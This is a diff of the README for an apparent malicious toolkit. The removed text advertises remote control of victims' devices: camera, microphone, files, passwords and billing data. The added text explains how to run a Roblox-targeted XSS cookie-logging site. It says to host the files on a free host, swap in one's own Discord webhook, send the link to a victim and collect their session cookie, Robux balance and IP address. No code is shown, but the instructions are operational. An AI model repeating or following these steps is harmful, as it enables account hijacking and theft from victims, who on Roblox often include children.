@@ -1,2 +1,15 @@
 # Purposes
-This file gives you acces to remote devices which are connected to the protocol in the settings of the remote event.  It allows you to upload, delete and copy files, open camera, open mic, start speaker, gather passwords, gives you access to their billing informations and a few more creepy features.  Don't use this with the protocol of someone else which you don't really know. Use it as a safety controler.  It's normally educational purposes, so if you are gonna mess with it. That would be on your own risk.
+Website Logging: Roblox based
+
+This file gives you acces to make a XSS - domain,
+if you want to manage these files. Make a account/website on 000webhost.com to continue managing these files. You'll have to extract and place the files in there!
+
+in the dualhook source file you'll find a discord webhook. Change the webhook with your own created Webhook!
+
+Send your domain to a victim and wait till you get their informations:
+- Cookie (JavaScript based)
+- Robux Currency (JSON based)
+- Robux Average Price (JSON based)
+- Internet Protocol (SSo based)
+
+if you are having problems you can always DM me via Discord
